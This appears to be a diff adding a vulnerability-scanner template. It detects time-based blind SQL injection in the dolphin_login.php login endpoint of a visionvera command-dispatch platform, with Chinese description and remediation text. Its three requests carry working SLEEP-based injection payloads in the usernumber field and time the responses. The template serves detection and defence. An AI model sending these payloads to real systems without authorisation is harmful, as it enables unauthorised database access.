@@ -1,0 +1,68 @@
+id: visionvera-zhihuidiaodu-dolphin-login-php-sqli
+
+info:
+  name: visionvera zhihuidiaodu dolphin_login.php SQL注入
+  author: bl
+  severity: high
+  tags: 指挥调度管理平台
+  description: |-
+    该模板用于识别 visionvera zhihuidiaodu 组件中 dolphin_login.php 接口的 SQL 注入风险。攻击者可通过构造恶意参数改变数据库查询语义，进而实现未授权读取、修改或绕过访问控制。实际利用效果受目标版本、系统配置及接口暴露范围影响。
+  remediation: >-
+    所有数据库访问均应使用参数化查询或安全的 ORM，按照允许列表校验输入，并为应用配置最小权限的数据库账号。升级到厂商已修复的版本，在完成修复前限制对受影响端点的访问。
+  
+variables:
+  randSecond1: '{{rand_int(6, 8)}}'
+  randSecond2: '{{rand_int(2, 3)}}'
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/api/client/dolphin_login.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: usernumber=1' AND (SELECT 4068 FROM (SELECT(SLEEP(0)))Vsc)-- Q&timestamp=1&sign=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: word
+        words:
+          - "{\"code\":\"5\", \"msg\":\"user not found\"}"
+        part: body
+        internal: true
+  - method: POST
+    path:
+      - '{{BaseURL}}/api/client/dolphin_login.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: usernumber=1' AND (SELECT 4068 FROM (SELECT(SLEEP({{randSecond1}})))Vsc)-- Q&timestamp=1&sign=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: dsl
+        dsl:
+          - duration - duration_1 >= randSecond1 * 1 - 0.5
+        condition: and
+        internal: true
+  - method: POST
+    path:
+      - '{{BaseURL}}/api/client/dolphin_login.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: usernumber=1' AND (SELECT 4068 FROM (SELECT(SLEEP({{randSecond2}})))Vsc)-- Q&timestamp=1&sign=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration - duration_1 >= randSecond2 * 1 - 0.5
+        condition: and
